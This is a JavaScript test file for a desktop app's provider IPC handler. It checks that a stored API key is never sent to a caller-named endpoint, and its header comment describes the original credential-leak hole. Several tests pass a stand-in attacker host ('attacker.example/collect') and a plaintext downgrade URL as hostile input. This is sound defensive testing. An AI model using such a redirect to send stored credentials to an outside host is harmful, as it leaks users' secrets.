/**
 * A stored provider key belongs to the endpoint its row was configured with.
 *
 * `providersListModels` takes a `baseUrl` from its caller, and the renderer host
 * runs plugin code with access to `window.piDesktop.invoke`. Before the guard,
 * one call naming an attacker-controlled endpoint made the main process read the
 * row's API key and send it as the request's `Authorization` header to that
 * host — the user's credential left the machine with no request the user made.
 *
 * These tests drive the real handler with a stub host process (the other
 * external edge) and a stub `fetch`, so the endpoint, the headers, and whether
 * any request happened at all are observed rather than inferred.
 */
import assert from "node:assert/strict";
import { register } from "node:module";
import test from "node:test";
import { IPC } from "@pi-desktop/shared";

register(new URL("./helpers/ts-import-hooks.mjs", import.meta.url));

const { registerProviderIpc } = await import("../electron/main/ipc/provider-ipc.ts");

const STORED_ENDPOINT = "https://api.trusted.example/v1";
const STORED_SECRET = "sk-stored-fixture-key";
const PROVIDER = {
  id: "provider-1",
  name: "Trusted",
  baseUrl: STORED_ENDPOINT,
  apiStyle: "chat_completions",
  modelId: "trusted-model",
  defaultModelId: "trusted-model",
  models: [{ id: "trusted-model" }],
  hasSecret: true,
};

const MODEL_LIST_BODY = { object: "list", data: [{ id: "trusted-model" }] };

/** The handler under test, plus the stub host process and outbound HTTP edge. */
function harness() {
  const handlers = new Map();
  const hostCalls = [];
  const requests = [];
  registerProviderIpc({
    registrar: {
      ipcMain: {},
      handle(channel, handler) {
        handlers.set(channel, handler);
      },
      handleWithEvent() {
        throw new Error("unexpected handleWithEvent");
      },
      assertMainWindowSender() {},
    },
    getHost: () => ({
      call: async (method, input) => {
        hostCalls.push({ method, input });
        if (method === "providers.getSecret") return { value: STORED_SECRET };
        if (method === "providers.listModels") return { models: [] };
        if (method === "providers.list") return { providers: [PROVIDER] };
        if (method === "providers.cacheModels") return { ok: true };
        throw new Error(`unexpected host RPC ${method}`);
      },
    }),
    modelsDevCatalog: {
      refresh: async () => false,
      ensureLoaded: async () => {},
      loadLocal: async () => {},
      getStatus: () => ({ loaded: false }),
      findModel: () => undefined,
      modelsForProvider: () => [],
    },
    vendorOAuth: {
      listVendors: async () => [],
      start: async () => ({ loginId: "fixture" }),
      respond: () => false,
      cancel: () => false,
      deleteAccount: async () => {},
      listModels: async () => [],
    },
    logger: { app: () => {} },
    enrichProvider: (row) => row,
    listRuntimeProviders: async () => [PROVIDER],
    enrichProviderList: (result) => result,
    bindingForModel: () => undefined,
  });

  const invoke = handlers.get(IPC.invoke.providersListModels);
  assert.equal(typeof invoke, "function", "providersListModels was not registered");

  /** Run the handler with the outbound HTTP edge replaced. */
  const probe = async (input) => {
    const fetchSpy = async (url, init) => {
      requests.push({
        url: String(url),
        headers: { ...(init?.headers ?? {}) },
      });
      return { ok: true, status: 200, json: async () => MODEL_LIST_BODY };
    };
    const original = globalThis.fetch;
    globalThis.fetch = fetchSpy;
    try {
      return await invoke(input);
    } finally {
      globalThis.fetch = original;
    }
  };

  return { probe, requests, hostCalls };
}

const secretCalls = (hostCalls) =>
  hostCalls.filter((call) => call.method === "providers.getSecret");

test("a caller-named endpoint never receives the stored provider key", async () => {
  const { probe, requests, hostCalls } = harness();

  await assert.rejects(
    probe({ providerId: PROVIDER.id, baseUrl: "https://attacker.example/collect" }),
    /refusing to probe https:\/\/attacker\.example\/collect/,
  );
  assert.deepEqual(requests, [], "no outbound request may be made");
  // The refusal is stronger than "the request was blocked": the credential is
  // never even hydrated, so there is nothing that could leak.
  assert.deepEqual(secretCalls(hostCalls), [], "the stored secret must not be read");
});

test("a hostile endpoint is refused even when the caller brings its own key", async () => {
  const { probe, requests } = harness();

  await assert.rejects(
    probe({
      providerId: PROVIDER.id,
      baseUrl: "https://attacker.example",
      apiKey: "sk-caller-supplied",
    }),
    /refusing to probe/,
  );
  assert.deepEqual(requests, []);
});

test("a plaintext downgrade of the stored endpoint is refused", async () => {
  const { probe, requests } = harness();

  await assert.rejects(
    probe({ providerId: PROVIDER.id, baseUrl: "http://api.trusted.example/v1" }),
    /refusing to probe/,
  );
  assert.deepEqual(requests, []);
});

test("the stored endpoint still probes with the stored key", async () => {
  const { probe, requests, hostCalls } = harness();

  const result = await probe({ providerId: PROVIDER.id, baseUrl: STORED_ENDPOINT });
  assert.equal(result.source, "remote");
  assert.equal(result.models[0].modelId, "trusted-model");
  // The way the host UI refreshes a saved row: the endpoint comes from the row,
  // not from the caller's copy of it.
  assert.deepEqual(requests, [
    {
      url: `${STORED_ENDPOINT}/models`,
      headers: { Authorization: `Bearer ${STORED_SECRET}` },
    },
  ]);
  assert.equal(secretCalls(hostCalls).length, 1);
  assert.ok(
    hostCalls.some((call) => call.method === "providers.cacheModels"),
    "a live answer is still written back to the model cache",
  );
});

test("an equivalent spelling of the stored endpoint is not mistaken for a redirect", async () => {
  const { probe, requests } = harness();

  // Case in the host, a default port, and a trailing slash describe the same
  // endpoint; the row's own spelling is what gets contacted.
  const result = await probe({
    providerId: PROVIDER.id,
    baseUrl: "https://API.TRUSTED.EXAMPLE:443/v1/",
  });
  assert.equal(result.source, "remote");
  assert.deepEqual(requests, [
    {
      url: `${STORED_ENDPOINT}/models`,
      headers: { Authorization: `Bearer ${STORED_SECRET}` },
    },
  ]);
});

test("the add-provider form still probes the endpoint the user typed", async () => {
  const { probe, requests, hostCalls } = harness();

  // No `providerId`: no stored row exists yet, so the endpoint and the key both
  // come from the caller and no stored credential is involved.
  const result = await probe({
    baseUrl: "https://new-gateway.example/v1",
    apiKey: "sk-typed-into-the-form",
    apiStyle: "chat_completions",
  });
  assert.equal(result.source, "remote");
  assert.deepEqual(requests, [
    {
      url: "https://new-gateway.example/v1/models",
      headers: { Authorization: "Bearer sk-typed-into-the-form" },
    },
  ]);
  assert.deepEqual(secretCalls(hostCalls), [], "no stored secret may be resolved without a row");
});
